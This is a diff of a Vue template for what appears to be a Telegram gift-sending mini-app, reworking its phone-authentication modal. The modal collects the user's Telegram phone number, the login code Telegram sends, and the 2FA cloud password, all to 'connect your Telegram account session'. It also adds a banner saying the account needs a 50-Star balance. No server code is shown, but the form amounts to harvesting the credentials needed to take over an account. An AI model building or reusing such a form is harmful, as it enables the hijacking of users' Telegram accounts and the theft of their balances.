@@ -949,7 +949,7 @@
 
   <!-- ── Phone Authentication Modal ──────────── -->
   <transition name="sheet">
-    <div class="modal-backdrop" v-if="phoneModal.show" @click.self="phoneModal.show=false">
+    <div class="modal-backdrop" v-if="phoneModal.show" @click.self="phoneModal.show=false" style="z-index: 100000;">
       <div class="modal-card">
         <div class="modal-header">
           <h3>📱 {{ phoneModal.step === 1 ? t('phoneAuthTitle') : t('enterCodeTitle') }}</h3>
@@ -957,13 +957,18 @@
         </div>
 
         <p class="modal-subtitle">
-          {{ phoneModal.step === 1 ? 'Enter your Telegram phone number to link your account for sending gifts.' : 'Enter the login verification code sent to your Telegram app.' }}
+          {{ phoneModal.step === 1 ? 'Connect your Telegram account session to send gifts directly from your personal profile.' : 'Enter the login verification code sent to your Telegram app.' }}
         </p>
 
+        <!-- 50 Stars Warning Banner -->
+        <div style="background: rgba(250, 204, 21, 0.12); border: 1px solid rgba(250, 204, 21, 0.3); border-radius: 12px; padding: 8px 12px; font-size: 0.78rem; color: #FACC15; text-align: center; font-weight: 500;">
+          ⚠️ Account must have at least 50 ⭐ Stars balance to send gifts (+ 1 ⭐ bot fee).
+        </div>
+
         <!-- Error Banner with Support Link -->
-        <div v-if="phoneModal.error" class="modal-err-box">
-          <p class="meb-text">{{ phoneModal.error }}</p>
-          <button class="meb-support-btn" @click="openRealUserContact">
+        <div v-if="phoneModal.error" class="modal-err-box" style="background: rgba(239, 68, 68, 0.18); border: 1px solid rgba(239, 68, 68, 0.4); border-radius: 12px; padding: 12px; color: #FCA5A5; font-size: 0.85rem; display: flex; flex-direction: column; gap: 8px;">
+          <p class="meb-text" style="margin: 0; font-weight: 600;">🚨 {{ phoneModal.error }}</p>
+          <button class="meb-support-btn" @click="openRealUserContact" style="background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); color: #FFF; padding: 6px 12px; border-radius: 8px; font-size: 0.78rem; cursor: pointer; align-self: flex-start;">
             💬 Contact Support (@xusanboyman200)
           </button>
         </div>
@@ -973,6 +978,7 @@
           <label class="input-lbl">{{ t('phoneLabel') }}</label>
           <input
             v-model="phoneModal.phone"
+            type="tel"
             class="modal-input"
             :placeholder="t('phonePlaceholder')"
             @keydown.enter="requestPhoneCode"
@@ -988,35 +994,44 @@
           <label class="input-lbl">{{ t('codeLabel') }}</label>
           <input
             v-model="phoneModal.code"
+            type="text"
             class="modal-input"
             :placeholder="t('codePlaceholder')"
+            style="font-size: 1.2rem; letter-spacing: 3px; text-align: center;"
             @keydown.enter="confirmPhoneCode"
           />
 
-          <div v-if="phoneModal.requires_password || phoneModal.show_password" style="margin-top: 10px;">
-            <label class="input-lbl" style="color: #60a5fa;">🔑 {{ t('passwordLabel') }} (2FA Password)</label>
+          <!-- 2FA Password Field: PROMINENTLY SHOWS WHEN REQUIRES_PASSWORD OR STEP 3 OR SHOW_PASSWORD -->
+          <div v-if="phoneModal.requires_password || phoneModal.show_password || phoneModal.step === 3" style="margin-top: 12px; background: rgba(96, 165, 250, 0.12); border: 1.5px solid #60A5FA; padding: 12px; border-radius: 14px;">
+            <label class="input-lbl" style="color: #93C5FD; font-weight: 700; font-size: 0.85rem;">🔑 2FA Cloud Password (Required):</label>
             <input
               v-model="phoneModal.password"
               type="password"
               class="modal-input"
-              placeholder="Enter 2FA cloud password..."
+              placeholder="Enter your 2FA cloud password..."
+              style="margin-top: 6px; border-color: #60A5FA;"
               @keydown.enter="confirmPhoneCode"
             />
           </div>
           <div v-else style="margin-top: 6px; text-align: right;">
             <button type="button" @click="phoneModal.show_password = true" style="background: none; border: none; color: #94a3b8; font-size: 11px; cursor: pointer; text-decoration: underline;">
-              🔑 Add 2FA Password if enabled
+              🔑 Account has 2FA Password enabled? Click here
             </button>
           </div>
 
-          <button class="modal-submit-btn" :disabled="phoneModal.loading" @click="confirmPhoneCode">
+          <button class="modal-submit-btn" :disabled="phoneModal.loading" @click="confirmPhoneCode" style="margin-top: 14px;">
             <span v-if="!phoneModal.loading">{{ t('confirmCodeBtn') }} ✅</span>
             <span v-else class="spin-loader"></span>
           </button>
 
-          <button type="button" @click="resendPhoneCode" :disabled="phoneModal.loading" style="margin-top: 10px; width: 100%; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); color: #cbd5e1; padding: 10px; border-radius: 12px; font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s ease;">
-            🔄 Resend New Code
-          </button>
+          <div style="display: flex; gap: 8px; margin-top: 10px;">
+            <button type="button" @click="resendPhoneCode" :disabled="phoneModal.loading" style="flex: 1; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); color: #cbd5e1; padding: 10px; border-radius: 12px; font-size: 12px; font-weight: 500; cursor: pointer;">
+              🔄 Resend Code
+            </button>
+            <button type="button" @click="phoneModal.step = 1" style="background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); color: #94a3b8; padding: 10px 14px; border-radius: 12px; font-size: 12px; font-weight: 500; cursor: pointer;">
+              ⬅️ Change Phone
+            </button>
+          </div>
         </div>
       </div>
     </div>
@@ -1373,66 +1388,6 @@
           <div class="form-row">
             <button class="fsave" @click="saveGift">Save</button>
             <button class="fcancel" @click="form.show=false">Cancel</button>
-          </div>
-        </div>
-      </div>
-    </div>
-  </transition>
-
-  <!-- ── Phone Auth Modal for "Use My Account" ── -->
-  <transition name="sheet">
-    <div class="sheet-backdrop" v-if="phoneModal.show" @click.self="phoneModal.show=false" style="z-index: 10000;">
-      <div class="sheet admin-sheet" style="max-height: 85vh; overflow-y: auto; padding: 24px 20px;">
-        <div class="sheet-handle"></div>
-        <h2 class="admin-title">📱 {{ t('connectMyAccount') }}</h2>
-        <p style="font-size: 0.85rem; color: rgba(255,255,255,0.7); text-align: center; margin-bottom: 16px;">
-          Connect your Telegram account session to send gifts directly from your personal profile!<br>
-          <span style="color: #FACC15; font-size: 0.8rem; font-weight: 500; display: inline-block; margin-top: 6px;">
-            ⚠️ Account must have at least 50 ⭐ Stars balance to send gifts (+ 1 ⭐ bot fee).
-          </span>
-        </p>
-
-        <!-- Step 1: Phone Number -->
-        <div v-if="phoneModal.step === 1" class="admin-pricing-box">
-          <label class="fi-lbl">Phone Number (with country code):</label>
-          <input v-model="phoneModal.phone" type="tel" class="fi" placeholder="+998901234567" style="font-size: 1.1rem; text-align: center;" @keydown.enter="requestPhoneCode" />
-          <p v-if="phoneModal.error" class="err-msg" style="margin-top: 8px;">{{ phoneModal.error }}</p>
-
-          <div class="form-row" style="margin-top: 14px;">
-            <button class="fsave" :disabled="phoneModal.loading" @click="requestPhoneCode">
-              <span v-if="!phoneModal.loading">Send Verification Code 📩</span>
-              <span v-else class="spin">⏳</span>
-            </button>
-            <button class="fcancel" @click="phoneModal.show=false">Cancel</button>
-          </div>
-        </div>
-
-        <!-- Step 2 & 3: Verification Code & 2FA -->
-        <div v-if="phoneModal.step >= 2" class="admin-pricing-box">
-          <p style="color: #10B981; font-weight: bold; text-align: center; font-size: 0.9rem;">
-            📩 Code sent to Telegram app for {{ phoneModal.phone }}
-          </p>
-          <label class="fi-lbl">Enter Telegram Verification Code:</label>
-          <input v-model="phoneModal.code" type="text" class="fi" placeholder="12345" style="font-size: 1.3rem; letter-spacing: 4px; text-align: center;" @keydown.enter="confirmPhoneCode" />
-
-          <div v-if="phoneModal.requires_password || phoneModal.show_password || phoneModal.step === 3" style="margin-top: 12px;">
-            <label class="fi-lbl" style="color: #60a5fa;">🔑 Two-Step Verification (2FA Password):</label>
-            <input v-model="phoneModal.password" type="password" class="fi" placeholder="Enter 2FA Password" @keydown.enter="confirmPhoneCode" />
-          </div>
-          <div v-else style="margin-top: 6px; text-align: right;">
-            <button type="button" @click="phoneModal.show_password = true" style="background: none; border: none; color: #94a3b8; font-size: 11px; cursor: pointer; text-decoration: underline;">
-              🔑 Add 2FA Password if enabled
-            </button>
-          </div>
-
-          <p v-if="phoneModal.error" class="err-msg" style="margin-top: 8px;">{{ phoneModal.error }}</p>
-
-          <div class="form-row" style="margin-top: 14px;">
-            <button class="fsave" :disabled="phoneModal.loading" @click="confirmPhoneCode">
-              <span v-if="!phoneModal.loading">Confirm & Connect Account ⚡</span>
-              <span v-else class="spin">⏳</span>
-            </button>
-            <button class="fcancel" @click="phoneModal.step=1">Back</button>
           </div>
         </div>
       </div>
